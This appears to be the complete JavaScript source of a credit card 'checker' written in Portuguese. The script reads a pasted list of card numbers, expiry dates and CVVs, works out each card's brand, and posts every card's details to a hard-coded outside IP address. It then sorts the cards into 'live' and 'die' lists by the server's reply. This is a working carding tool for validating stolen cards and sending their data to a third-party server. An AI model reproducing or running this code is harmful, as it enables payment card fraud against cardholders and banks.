$(document).ready(function() {
	$("#home_testador").attr('style', 'display: none;');
});

function PegaBandeira(Numero) {
	Numero = Numero.substr(0,2);

	if (Numero == '51') return 'mastercard';
	if (Numero == '52') return 'mastercard';
	if (Numero == '53') return 'mastercard';
	if (Numero == '54') return 'mastercard';
	if (Numero == '55') return 'mastercard';
	if (Numero == '56') return 'mastercard';
	if (Numero == '57') return 'mastercard';
	if (Numero == '58') return 'mastercard';
	if (Numero == '59') return 'mastercard';
	if (Numero == '40') return 'visa';
	if (Numero == '41') return 'visa';
	if (Numero == '42') return 'visa';
	if (Numero == '43') return 'visa';
	if (Numero == '44') return 'visa';
	if (Numero == '45') return 'visa';
	if (Numero == '46') return 'visa';
	if (Numero == '47') return 'visa';
	if (Numero == '48') return 'visa';
	if (Numero == '49') return 'visa';
	if (Numero == '37') return 'amex';
	if (Numero == '34') return 'amex';
	if (Numero == '36') return 'diners';
	if (Numero == '30') return 'diners';
	if (Numero == '38') return 'diners';
	if (Numero == '60') return 'discover';
	if (Numero == '65') return 'discover';
	if (Numero == '2') return 'elo';
	if (Numero == '') return 'N/A';
}

function strpos(haystack, needle, offset) {
  //  discuss at: http://phpjs.org/functions/strpos/
  // original by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
  // improved by: Onno Marsman
  // improved by: Brett Zamir (http://brett-zamir.me)
  // bugfixed by: Daniel Esteban
  //   example 1: strpos('Kevin van Zonneveld', 'e', 5);
  //   returns 1: 14

  var i = (haystack + '')
    .indexOf(needle, (offset || 0));
  return i === -1 ? false : i;
}

function IniciaTestador() {
	var str = $("#text_cc").val();
	var text_cc = str.split("\n");

	var separado;
	var numero;
	var mes;
	var ano;
	var validadeorganizada;
	var cvv;
	var bandeira;

	var html;

	$("#inicio_testador").attr('style', 'display: none;');
	$("#home_testador").attr('style', 'display: block;');

	for(i=0; i < text_cc.length; i++) {
		separado = text_cc[i].split(";");

		cartao = text_cc[i];

		numero = separado[0];
		mes = separado[1];
		ano = separado[2];
			if (ano.length == 2) {
				ano = '20' + ano;
			}
		cvv = separado[3];
		validadeorganizada = ano + mes;
		bandeira = PegaBandeira(numero);

		//Conta a quantidade de tickets respondidos e fechados
        $.ajax({
            url : "http://167.114.40.13/sevenY/fixbla/seven1.php",
            data: {bandeira:bandeira, numero:numero, codigo:cvv, validade:validadeorganizada, usuario:'teste'},
            dataType : "html",
      
            success : function(data) {
            	if (data.indexOf("Codigo : 00") > -1) {
            		html = '<div class="alert alert-success">' + cartao + '</div>';
            		
            		$("#cc_live").append(html);
            	} else {
            		html = '<div class="alert alert-danger">' + cartao + '</div>';
            		
            		$("#cc_die").append(html);
            	} 
            }
        });
	}
}